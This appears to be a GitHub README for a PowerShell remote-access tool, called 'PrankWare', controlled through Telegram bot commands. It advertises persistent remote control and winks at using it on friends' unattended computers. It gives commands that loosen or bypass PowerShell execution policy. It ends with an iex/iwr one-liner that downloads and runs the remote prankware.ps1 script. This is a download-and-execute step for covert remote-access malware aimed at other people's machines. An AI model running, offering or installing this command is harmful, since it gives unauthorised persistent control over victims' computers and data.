# Telegram-Controlled PowerShell Script


Get a persistence remote control access through telegram commands. Don't use it when ur friends are away from their computer 🤫

## 🛠 Prerequisites

- Windows 10 or newer
- PowerShell 5 or later (built-in)
- Internet connection
- A Telegram bot token (from [@BotFather](https://t.me/BotFather))
- Your own Telegram user ID (use [@userinfobot](https://t.me/userinfobot))

## 🔒 Enable Script Execution

Before running the script, allow PowerShell to execute local scripts:

## Powershell (Permanent fix)
```
Set-ExecutionPolicy -Scope CurrentUser -ExecutionPolicy RemoteSigned
```
## Powershell (One-time fix for your session)
```
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
```
## Powershell pipeline
```
iex (iwr "https://raw.githubusercontent.com/xtofuub/PrankWare/refs/heads/main/prankware.ps1")
